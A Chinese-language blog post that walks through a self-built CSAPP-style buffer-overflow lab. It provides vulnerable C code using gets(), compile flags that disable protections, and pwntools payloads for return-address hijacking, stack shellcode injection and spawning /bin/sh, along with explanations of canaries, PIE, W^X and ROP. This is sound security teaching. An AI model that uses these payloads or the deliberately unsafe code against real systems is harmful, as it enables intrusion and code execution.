---
title: CSAPP-attack-lab
published: 2025-09-19
description: 自制attack-lab
tags: [gdb, Lab, CSAPP]
category: 调试工具
draft: false
---
亲手制作一个经典的缓冲区溢出(Buffer Overflow)攻击案例。这篇博文将为你讲清楚整个攻击的原理，以及几个关键概念：`RSP`（栈指针）、`gets()` 函数的危险性、金丝雀(`Canary`)、PIE (`Position-Independent Executable`) 和 W^X (`Write XOR Execute`)。


## 1. gets() —— unsafe function
核心是通过一个名为 `gets()` 的非安全函数，向一个固定大小的缓冲区 `buf[16]` 写入超量数据。这些超量的数据会 "溢出" 缓冲区的边界，覆盖掉栈上更重要的数据，特别是**函数的返回地址**。通过精心构造溢出的数据，我们可以将返回地址修改为我们想要执行的任何代码的地址（在这个例子中是 `func()` 函数），从而劫持程序的控制流。
- gcc -g -fno-stack-protector -no-pie main.c
```cpp
#include <stdio.h>
#include <stdlib.h>

void func() { printf("akakak\n"); }

void getstr() {
    char buf[16];
    gets(buf); // 如果你的VSCode给了你一个Warning是正常的，因为这就是不该使用的不安全函数（
}

int main() {
    getstr();
    printf("I am fine.\n");
    exit(0);
    return 0;
}
// gcc -g -fno-stack-protector -no-pie main.c
// python3 att1.py && ./a.out < hex
// objdump -d ./a.out > a.md
```
- python3 att1.py && ./a.out < hex
```python
# att1.py
from pwn import *

padding = b'A' * 24         # 1. try change into char[10], why padding = 18?

addr_func = 0x401176
addr_exit_gadget = 0x4011d1 # 2. (if `-Og`: change into 0x4011cb, and padding = 18)

payload = padding + p64(addr_func) + p64(addr_exit_gadget)

with open('hex', 'wb') as f:
    f.write(payload)
```
- objdump -d ./a.out > a.md
- gdb ./a.out (-x init)
```asm
0000000000401176 <func>:
  401176:	f3 0f 1e fa          	endbr64 
  40117a:	55                   	push   %rbp
  40117b:	48 89 e5             	mov    %rsp,%rbp
  40117e:	48 8d 05 7f 0e 00 00 	lea    0xe7f(%rip),%rax        # 402004 <_IO_stdin_used+0x4>
  401185:	48 89 c7             	mov    %rax,%rdi
  401188:	e8 d3 fe ff ff       	call   401060 <puts@plt>
  40118d:	90                   	nop
  40118e:	5d                   	pop    %rbp
  40118f:	c3                   	ret    

0000000000401190 <getstr>:
  401190:	f3 0f 1e fa          	endbr64 
  401194:	55                   	push   %rbp
  401195:	48 89 e5             	mov    %rsp,%rbp
  401198:	48 83 ec 10          	sub    $0x10,%rsp
  40119c:	48 8d 45 f6          	lea    -0xa(%rbp),%rax
  4011a0:	48 89 c7             	mov    %rax,%rdi
  4011a3:	b8 00 00 00 00       	mov    $0x0,%eax
  4011a8:	e8 c3 fe ff ff       	call   401070 <gets@plt>
  4011ad:	90                   	nop
  4011ae:	c9                   	leave  
  4011af:	c3                   	ret    

00000000004011b0 <main>:
  4011b0:	f3 0f 1e fa          	endbr64 
  4011b4:	55                   	push   %rbp
  4011b5:	48 89 e5             	mov    %rsp,%rbp
  4011b8:	b8 00 00 00 00       	mov    $0x0,%eax
  4011bd:	e8 ce ff ff ff       	call   401190 <getstr>
  4011c2:	48 8d 05 42 0e 00 00 	lea    0xe42(%rip),%rax        # 40200b <_IO_stdin_used+0xb>
  4011c9:	48 89 c7             	mov    %rax,%rdi
  4011cc:	e8 8f fe ff ff       	call   401060 <puts@plt>
  4011d1:	bf 00 00 00 00       	mov    $0x0,%edi
  4011d6:	e8 a5 fe ff ff       	call   401080 <exit@plt>
```
---

### 栈、RSP 和函数调用过程

要理解这个攻击，首先必须理解程序在调用函数时，内存中的**栈（Stack）**是如何工作的。
栈是一个后进先出(LIFO)的数据结构，主要用于存储函数的局部变量及、参数以函数调用相关的信息。其中，有两个非常重要的寄存器：
*   **RSP (Stack Pointer)**：栈指针寄存器。它始终指向栈的顶部。当数据被压入(push)栈时，RSP的地址减小；当数据被弹出(pop)栈时，RSP的地址增大（在 x86-64 架构中，栈是从高地址向低地址增长的）。
*   **RBP (Base Pointer)**：基址指针寄存器。它指向当前函数栈帧(Stack Frame)的底部，作为一个固定的“锚点”，方便函数访问自己的局部变量和参数。

**一个正常的函数调用流程 (`main` 调用 `getstr`) 如下：**

1.  **保存返回地址**：当 `main` 函数执行 `call getstr` 指令时，CPU 会自动将 `call` 指令的下一条指令的地址（即 `0x4011c2`，也就是 `printf("I am fine.\n")` 的起始位置）压入栈中。这个地址就是 `getstr` 函数执行完毕后应该返回的地方。
2.  **保存旧的 RBP**：`getstr` 函数开始执行，首先会执行 `push %rbp`，将 `main` 函数的 RBP 保存到栈上，以便函数返回时可以恢复。
3.  **建立新栈帧**：执行 `mov %rsp, %rbp`，将当前的 RSP 赋值给 RBP，为 `getstr` 建立一个新的栈帧基址。
4.  **为局部变量分配空间**：执行 `sub $0x10, %rsp`，将 RSP 向下移动 16 个字节（`0x10`），为局部变量 `char buf[16]` 分配空间。

此时，`getstr` 函数的栈帧布局如下（地址由高到低）：

```
    | ...                     |
    +-------------------------+
    | 返回地址 (8字节)         | <-- getstr() 结束后要跳回的地方 (0x4011c2)
    +-------------------------+
    | 保存 main 的 RBP (8字节) | <-- RBP 指向这里
    +-------------------------+
    |                         |
    | char buf[16] (16字节)   | <-- gets() 的目标缓冲区
    |                         |
    +-------------------------+ <-- RSP 指向这里
    | ...                     |
```

---

### gets() 的危险性：为什么可以修改返回地址？

`gets()` 函数的致命缺陷在于：**它不检查目标缓冲区的大小**。它会一直从输入流读取数据，直到遇到换行符或文件结束符为止，然后将所有读到的内容（除了换行符）存入我们给它的缓冲区。
在这个例子中，`buf` 只有 16 字节。如果我们输入超过 16 字节的数据会发生什么？
*   前 16 个字节会正确地填充 `buf`。
*   从第 17 个字节开始，就会覆盖掉紧邻 `buf` 的高地址内存，也就是我们上面栈帧图中的 "保存 main 的 RBP"。
*   如果继续输入，就会覆盖掉 "返回地址"。
> **这就是攻击的关键所在！**
在 `att1.py` 脚本中，我们构造了一个 `payload`：
```python
padding = b'A' * 24
addr_func = 0x401176
addr_exit_gadget = 0x4011d1
payload = padding + p64(addr_func) + p64(addr_exit_gadget)
```

**为什么填充（padding）应该是 24 字节？**
*   `buf` 本身的大小是 16 字节。
*   紧接着 `buf` 的是保存的 RBP，在 64 位系统上，一个地址是 8 字节。
*   所以，我们需要 `16 + 8 = 24` 个字节的垃圾数据（比如 `'A'`）来填满 `buf` 和覆盖掉保存的 RBP。
当这 24 个字节的 `'A'` 写入后，我们再写入的数据就会精确地覆盖在**返回地址**所在的位置。

**攻击流程解析：**
1.  `getstr` 函数调用 `gets(buf)`。
2.  我们通过重定向输入 `< hex` 将 `payload` 喂给程序。
3.  `gets` 函数将 `payload` 写入 `buf`：
    *   前 24 个 'A' 覆盖了 `buf` 和保存的 `RBP`。
    *   接下来的 8 字节 `p64(addr_func)` (即 `0x401176` 的二进制表示) 覆盖了原有的返回地址。
    *   再接下来的 8 字节 `p64(addr_exit_gadget)` 放在了栈上更高处。
4.  `getstr` 函数执行完毕，最后执行 `ret` 指令。
5.  `ret` 指令的作用是从栈顶弹出一个地址，并跳转到该地址执行。此时栈顶的值不再是正常的 `0x4011c2`，而是被我们修改过的 `0x401176`（`func` 函数的地址）。
6.  CPU 跳转到 `0x401176` 开始执行，也就是 `func()` 函数。屏幕上打印出 "akakak"。
7.  `func` 函数执行完毕后，它也有一个 `ret` 指令。此时 RSP 指向了我们 payload 中的下一个地址 `addr_exit_gadget` (`0x4011d1`)。于是程序跳转到 `main` 函数中调用 `exit` 的地方，实现平稳退出，而不是因为栈被破坏而崩溃。

**总结：** `gets()` 之所以能修改返回地址，是因为它不对输入长度做检查，导致数据可以溢出缓冲区，像洪水一样淹没并改写栈上更高地址处的关键数据，如返回地址。我们利用 `ret` 指令无条件信任栈顶地址的特性，实现了控制流的劫持。

---

### 防御机制：金丝雀（Stack Canary）的作用 (why must `-fno-stack-protector`)

为了对抗这种基于栈的缓冲区溢出攻击，编译器引入了一种保护机制，叫做“栈保护者”或“金丝雀（Canary）”。

**工作原理：**
1.  **放置金丝雀**：在函数开始时（分配局部变量后，程序真正执行前），在栈上、**返回地址的前面**，放置一个特殊的、随机生成的值。这个值就是“金丝雀”。
    ```
        +---------------------+
        | 返回地址 (8字节)      |
        +---------------------+
        | 金丝雀 (8字节)        | <-- 一个随机值
        +---------------------+
        | 保存的 RBP (8字节)    |
        +---------------------+
        | char buf[16] (16字节) |
        +---------------------+
    ```
2.  **检查金丝雀**：在函数即将返回（执行 `ret` 指令）之前，程序会检查这个金丝雀的值是否被改变。
3.  **触发警报**：
    *   如果金丝雀的值没有变，说明栈没有被溢出数据破坏，函数可以安全返回。
    *   如果金丝雀的值被改变了，说明发生了缓冲区溢出，攻击者在尝试覆盖返回地址时，必然会先覆盖掉金丝雀。程序会检测到这一情况，并立即终止运行（通常是调用 `__stack_chk_fail`），而不是执行被篡改的返回地址。

这个名字来源于“煤矿里的金丝雀”，矿工会带金丝雀下井，因为金丝雀对有毒气体非常敏感，会先于矿工死亡，从而起到预警作用。在这里，金丝雀值的改变就是程序受到攻击的“警报”。

在我们编译时使用了 `-fno-stack-protector` 标志，这就是明确地告诉 GCC 编译器：“不要开启金丝雀保护”。正因为如此，攻击才能成功。如果去掉这个标志，默认情况下 GCC 会开启金丝雀保护，我们的 payload 在覆盖返回地址前会先破坏金丝雀，导致程序在 `getstr` 函数返回前就直接崩溃退出。

---

### 防御机制：PIE (Position-Independent Executable) 的作用 (why must `-no-pie`)

PIE（位置无关可执行文件）是另一种非常重要的安全机制，它与 ASLR（地址空间布局随机化）协同工作。

**工作原理：**
1.  **无 PIE 的情况**：我们使用了 `-no-pie` 标志，这意味着程序每次加载到内存时，其代码段（`.text` section）的基地址都是固定的。因此，`func` 函数的地址永远是 `0x401176`，`main` 函数的地址永远是 `0x4011b0`。这让攻击者可以非常容易地确定要跳转的目标地址。
2.  **有 PIE 的情况**：如果开启了 PIE 编译（现在大多数系统的默认设置），生成的可执行文件就是“位置无关”的。当操作系统加载这个程序时，它会为程序的代码段、数据段等随机选择一个基地址。

**PIE 如何挫败攻击？**
如果开启了 PIE，`func` 函数的地址在程序每次运行时都会改变。
*   第一次运行，它可能在 `0x55abcdef1176`。
*   第二次运行，它可能在 `0x56fedcba1176`。

虽然函数相对于程序基地址的偏移量 (`0x1176`) 是固定的，但整个程序的基地址是随机的。这就导致我们在 `att1.py` 中硬编码的地址 `addr_func = 0x401176` 几乎肯定是错的。payload 会让程序跳转到一个无效或非预期的地址，导致程序崩溃，攻击失败。

要绕过 PIE+ASLR，攻击者需要先通过其他漏洞（如信息泄露漏洞）来泄漏程序加载到内存后的某个地址，然后根据这个地址计算出 `func` 函数的实际地址，这大大增加了攻击的难度。

我们这里使用的 `-no-pie` 标志禁用了这个保护，使得 `func` 的地址固定不变，制作一个简易的Lab :)

---

## 2. execstack —— W^X

- 我们之前的有 `4011d6:	e8 a5 fe ff ff       	call   401080 <exit@plt>` 这一个很好的 `exit_gadget` 函数，可以让我们在破坏栈帧结构后也能优雅的退出。加大难度，如果是一个普通退出的 C 程序呢， 
- gcc -g -z execstack -fno-stack-protector -Og -no-pie main.c
```cpp
#include <stdio.h>
#include <stdlib.h>

void func() { printf("akakak\n"); }

void getstr() {
    char buf[16];
    // printf("Address of buffer (buf): %p\n", buf);
    gets(buf);
}

int main() {
    getstr();
    printf("I am fine.\n");
    // exit(0);
    return 0;
}
// gcc -g -z execstack -fno-stack-protector -Og -no-pie main.c
// python3 att2.py && setarch (uname -m) -R ./a.out < hex
// objdump -d ./a.out > a.md
// setarch (uname -m) -R ./a.out < hex
```
```python
# att2.py
from pwn import *

func_addr = 0x401156
Shellcode = asm("push {}; push {}; ret".format(hex(0x4011a2), hex(func_addr)))
padding = b'A' * 13 # (24 - len(Shellcode))
addr_exit_buf = 0x7fffffffdb10 # 需要你自行去找栈的位置，因为环境变量不同（gdb 的环境变量也与你的Shell的环境变量多一些）

payload = Shellcode + padding + p64(addr_exit_buf)

with open('hex', 'wb') as f:
    f.write(payload)
```
```asm
0000000000401156 <func>:
  401156:	f3 0f 1e fa          	endbr64 
  40115a:	48 83 ec 08          	sub    $0x8,%rsp
  40115e:	48 8d 3d 9f 0e 00 00 	lea    0xe9f(%rip),%rdi        # 402004 <_IO_stdin_used+0x4>
  401165:	e8 e6 fe ff ff       	call   401050 <puts@plt>
  40116a:	48 83 c4 08          	add    $0x8,%rsp
  40116e:	c3                   	ret    

000000000040116f <getstr>:
  40116f:	f3 0f 1e fa          	endbr64 
  401173:	48 83 ec 18          	sub    $0x18,%rsp
  401177:	48 89 e7             	mov    %rsp,%rdi
  40117a:	b8 00 00 00 00       	mov    $0x0,%eax
  40117f:	e8 dc fe ff ff       	call   401060 <gets@plt>
  401184:	48 83 c4 18          	add    $0x18,%rsp
  401188:	c3                   	ret    

0000000000401189 <main>:
  401189:	f3 0f 1e fa          	endbr64 
  40118d:	48 83 ec 08          	sub    $0x8,%rsp
  401191:	b8 00 00 00 00       	mov    $0x0,%eax
  401196:	e8 d4 ff ff ff       	call   40116f <getstr>
  40119b:	48 8d 3d 69 0e 00 00 	lea    0xe69(%rip),%rdi        # 40200b <_IO_stdin_used+0xb>
  4011a2:	e8 a9 fe ff ff       	call   401050 <puts@plt>
  4011a7:	b8 00 00 00 00       	mov    $0x0,%eax
  4011ac:	48 83 c4 08          	add    $0x8,%rsp
  4011b0:	c3                   	ret    
```
很好，这是一个绝佳的进阶问题。去掉 `exit(0)` 后，我们失去了那个可以让我们“优雅退出”的 `gadget`。现在，`main` 函数的结尾是一个 `return 0;`，它在汇编层面最终也是一个 `ret` 指令。如果我们像上次一样，在调用完 `func()` 之后让它 `ret` 回一个无效的地址（或者一个已经被我们破坏的栈上的地址），程序就会崩溃。
现在我们考虑 **在栈上执行我们自己的代码 (Shellcode)**。

---

### 新的攻击思路：栈执行与 Shellcode
之前的攻击是 **“借用”** 程序已有的代码 (`func`)，这属于 **“代码重用”** 攻击。
这次的攻击是 **“注入”** 我们自己的代码并执行它。这依赖于一个关键的编译选项：`-z execstack`。

#### **Shellcode 的作用**
**Shellcode** 是一小段被精心设计，用于在目标机器上执行的二进制机器码。它之所以叫 "Shellcode"，是因为其最经典的作用就是为攻击者获取一个交互式的命令行 "Shell" (比如 `/bin/sh`)。

在我们例子中，Shellcode 并非为了弹出一个 Shell，而是为了实现一个更精巧的控制流：
1.  调用我们想调用的 `func()` 函数。
2.  在 `func()` 执行完毕后，让程序能恢复到正常的执行流程中，而不是崩溃。

Python 脚本中的这行代码就是在生成这个 Shellcode：
```python
Shellcode = asm("push {}; push {}; ret".format(hex(0x4011a2), hex(func_addr)))
```
让我们分解这段汇编：
*   `push 0x4011a2`: `0x4011a2` 是 `main` 函数中 `call getstr` 指令的下一条指令地址，也就是 `printf("I am fine.\n")` 的入口。这行代码的作用是把**正常的返回地址**压入栈中。
*   `push 0x401156`: `0x401156` 是 `func` 函数的地址。
*   `ret`: 这个 `ret` 指令会从栈顶弹出地址并跳转。此时栈顶是刚刚压入的 `func` 的地址。所以，程序会跳转去执行 `func()`。

**整个流程是这样的：**
1.  `getstr()` 函数返回时，`ret` 指令会跳转到我们覆盖的返回地址，也就是 `addr_exit_buf` (栈上缓冲区的起始地址)。
2.  CPU 开始执行放在缓冲区里的 **Shellcode**。
3.  Shellcode 先把**正常返回地址** (`0x4011a2`) 压栈，再把 `func` 的地址压栈。
4.  Shellcode 执行 `ret`，跳转到 `func` 函数，屏幕上打印 "akakak"。
5.  `func` 函数执行完毕后，它自己的 `ret` 指令会弹出栈顶的地址并跳转。此时栈顶正是我们 Shellcode 之前放进去的**正常返回地址 `0x4011a2`**。
6.  程序跳转回 `main` 函数，继续执行 `printf("I am fine.\n")`，然后正常退出。

这是一个非常巧妙的、"无痕" 的攻击，因为它最终恢复了程序的正常执行流。

---

### 栈安全的核心原则：W^X (Write XOR Execute)
最重要的原则之一就是 **W^X**（发音为 "W xor X"），即 **内存页要么是可写的（Writable），要么是可执行的（Executable），但绝不能同时是两者**。
*   **栈（Stack）/ 堆（Heap）**：这些内存区域需要被程序动态地写入数据（局部变量、动态分配的对象等），所以它们**必须是可写的（W）**。根据 W^X 原则，它们就**绝不应该是可执行的（X）**。
*   **代码段（.text）**：这里存放程序的指令，CPU 需要读取并执行它们，所以它**必须是可执行的（X）**。为了防止恶意代码篡改程序逻辑，它就**绝不应该是可写的（W）**。
这个保护通常由硬件（CPU 的 **NX Bit** - No-eXecute bit，或 AMD 的 **EVP** - Enhanced Virus Protection）和操作系统共同实现。

**`-z execstack` 选项的作用就是告诉编译器和链接器：“请为这个程序打破 W^X 规则，将栈所在的内存区域标记为可执行”。** 这就为我们的 Shellcode 攻击打开了大门。在现代默认安全的编译环境中，这个选项是不会开启的。如果没有这个选项，即使我们成功地将返回地址指向了栈上的 Shellcode，当 CPU 尝试执行栈上的指令时，也会触发一个硬件异常，导致程序立即崩溃。

---

### 为什么 gdb 上成功攻击了，但是在 Shell 中出现 `SIGSEGV`

我们分两步来解答：
1.  为什么环境变量会在栈上？
2.  这为什么会导致栈布局偏移？

**为什么环境变量会在栈上？**
这要从一个程序是如何被操作系统启动说起。当你从shell（如bash, fish）中执行一个命令 `./a.out` 时，发生了以下一系列事件：

1.  **Shell 创建一个新进程**：Shell首先调用 `fork()` 系统调用，创建一个与自己几乎一模一样的子进程。
2.  **子进程准备执行新程序**：这个新的子进程将要执行 `./a.out`。它通过调用 `execve()` 这个系统调用来做到这一点。`execve` 的作用是**用一个全新的程序（./a.out）来完全替换当前进程的内存空间**。
3.  **内核加载程序并传递信息**：这是最关键的一步。当内核处理 `execve` 请求时，它会：
    *   加载 `./a.out` 的二进制代码和数据到内存中。
    *   为新程序创建一个全新的虚拟内存空间，包括代码段、数据段、堆和**栈**。
    *   **问题来了**：新程序 `a.out` 需要知道它的运行环境。比如，它需要知道命令行参数（arguments, `argv`）和环境变量（environment variables, `envp`）。这些信息都是由它的父进程（shell）传递过来的。
4.  **内核选择栈来传递信息**：内核必须把 `argv` 和 `envp` 这些动态的信息放到新进程内存的某个地方，以便程序一启动就能访问到。
    *   **为什么不是堆？** 堆（Heap）是程序在运行时动态管理的，程序启动时它甚至还不存在。
    *   **为什么不是数据段？** 数据段（.data, .bss）是为编译时就已知的全局变量和静态变量准备的，大小是固定的。
    *   **为什么是栈？** 栈（Stack）是完美的场所！它是一块预留给进程的内存区域，从进程地址空间的最高处开始。内核可以在程序的第一条指令执行之前，就把所有启动信息（环境变量、命令行参数等）整齐地“推入”到这个栈的顶部。这是一种非常简单高效的设计。

所以，一个新进程启动时，它的栈顶并不是空的，而是由内核预先填充了所有必要的启动信息。

这就是为什么会导致栈布局偏移，在GDB中计算出的精确栈地址 `0x7fffffffdb10`，在真实运行时会变成 `0x7fffffffda70` 的根本原因。

---

### ROP 的思想：当 W^X 开启时怎么办？

好了，现在我们知道，在有 W^X 保护的现代系统中，栈是不可执行的，我们的 Shellcode 注入攻击会失败。那么攻击者就束手无策了吗？当然不。这就催生了更高级的攻击技术：**ROP (Return-Oriented Programming, 面向返回的编程)**。

**ROP 的核心思想是：既然我不能注入自己的代码，那我就“偷”和“借”程序本身已有的代码片段来用。**

1.  **寻找 Gadgets**：攻击者会扫描程序的整个代码段（`.text` section，这是可执行的），寻找一些有用的、以 `ret` 指令结尾的短指令序列。这些序列被称为 **"Gadgets"**。
2.  **经典的 Gadget**：例如 `pop rdi; ret` 就是一个极其有用的 Gadget。
    *   在 64 位 Linux 系统中，函数调用的约定是，第一个参数通过 `RDI` 寄存器传递。
    *   `pop rdi` 指令的作用是将栈顶的数据弹到 `RDI` 寄存器中。
    *   因此，`pop rdi; ret` 这个 Gadget 给了我们**控制第一个函数参数**的能力。
3.  **链式调用 (Chaining)**：ROP 的精髓在于“链”。`ret` 指令不仅是 Gadget 的结尾，也是连接下一个 Gadget 的“胶水”。攻击者可以在栈上精心布置一个数据序列：
    ```
        +-----------------------------------+
        | 地址 of "pop rdi; ret" gadget     | <-- 被覆盖的返回地址
        +-----------------------------------+
        | Value for RDI (addr of "/bin/sh") | <-- 将被 pop 进 RDI 的值
        +-----------------------------------+
        | 地址 of system() function         | <-- "pop rdi; ret" 执行完后，ret 会跳转到这里
        +-----------------------------------+
        | ... (可以接更多 gadget 和数据) ... |
        +-----------------------------------+
    ```

**攻击流程如下：**
1.  函数返回，`ret` 指令跳转到 `pop rdi; ret` Gadget 的地址。
2.  CPU 执行 `pop rdi`，将栈上的 `/bin/sh` 字符串地址弹入 `RDI` 寄存器。
3.  CPU 执行 `ret`，此时栈顶是 `system()` 函数的地址，于是程序跳转到 `system()`。
4.  `system()` 函数开始执行，它一看 `RDI` 寄存器，发现参数是 `"/bin/sh"`，于是它就为我们打开了一个 Shell。

通过在栈上布置一连串的 `[Gadget地址] [数据] [Gadget地址] [数据] ...`，攻击者可以像搭乐高积木一样，将这些小程序代码片段拼接起来，完成复杂的操作（如调用多个函数、进行计算等），其效果等同于执行了一段完整的 Shellcode，但整个过程中没有在栈上执行任何一个字节，完美地绕过了 W^X 保护。

---

## 3. 如果我都有 W&X 的栈了，那我不是可以随心随意地执行汇编代码了吗（笑）
下面我们尝试在一个"普通"的gets()读取函数后，直接启动一个 `/bin/sh` !
修改main.c
```cpp
void getstr() {
    char buf[48]; // 大一点的空间来存我们的汇编代码
    printf("Address of buffer (buf): %p\n", buf);
    gets(buf);
}
```
```python
# att-sh.py
from pwn import *
context.arch = 'amd64'
# nop_sled = asm('nop') * 13

func_addr = 0x401156
Shellcode = asm("sub rsp, 0x48") + asm(shellcraft.sh())
padding = b'A' * (56 - len(Shellcode))
addr_exit_buf = 0x7fffffffdc40
# addr_exit_buf = 0x7fffffffdb60 # gdb
print(len(Shellcode))
payload = Shellcode + padding + p64(addr_exit_buf)

with open('hex', 'wb') as f:
    f.write(payload)

#    0x7fffffffdb60:      sub    $0x48,%rsp               # 开辟一块栈空间，防止 push 指令覆盖我们的汇编代码
# => 0x7fffffffdb64:      push   $0x68                    # h
#    0x7fffffffdb66:      movabs $0x732f2f2f6e69622f,%rax # /bin/s
#    0x7fffffffdb70:      push   %rax
#    0x7fffffffdb71:      mov    %rsp,%rdi
#    0x7fffffffdb74:      push   $0x1016972
#    0x7fffffffdb79:      xorl   $0x1010101,(%rsp)
#    0x7fffffffdb80:      xor    %esi,%esi
#    0x7fffffffdb82:      push   %rsi
#    0x7fffffffdb83:      push   $0x8
#    0x7fffffffdb85:      pop    %rsi
#    0x7fffffffdb86:      add    %rsp,%rsi
#    0x7fffffffdb89:      push   %rsi
#    0x7fffffffdb8a:      mov    %rsp,%rsi
#    0x7fffffffdb8d:      xor    %edx,%edx
#    0x7fffffffdb8f:      push   $0x3b
#    0x7fffffffdb91:      pop    %rax
#    0x7fffffffdb92:      syscall 
#    0x7fffffffdb94:      rex.B
#    0x7fffffffdb95:      rex.B
```
### 启动！/bin/sh
```sh
gcc -g -z execstack -fno-stack-protector -no-pie -Og main.c && objdump -d ./a.out > a.md
python3 att-sh.py
(cat hex; cat) | setarch $(uname -m) -R ./a.out

# --- 示例 ---
ls
a.md  a.out  att-sh.py  att.py  hex  init  main.c
cd ..
ls
Desktop    Downloads  Music      Public     Templates  linux      sshfiles
Documents  Pictures   Videos     mnt        tmp        win
ps
    PID TTY          TIME CMD
  91051 pts/4    00:00:00 fish
  91412 pts/4    00:00:00 sh
  91414 pts/4    00:00:00 cat
  91528 pts/4    00:00:00 ps
# CTRL+D / exit
```


### 总结：
*   **Shellcode 注入**：强大直接，但依赖于一个“不安全”的前提——**栈是可执行的 (W&X)**。
*   **ROP**：更为复杂和精巧，它通过重用程序自身的可执行代码片段 (Gadgets)，在**栈不可执行 (W^X)** 的安全环境中，依然能实现任意代码执行的效果。它是现代二进制漏洞利用的基石。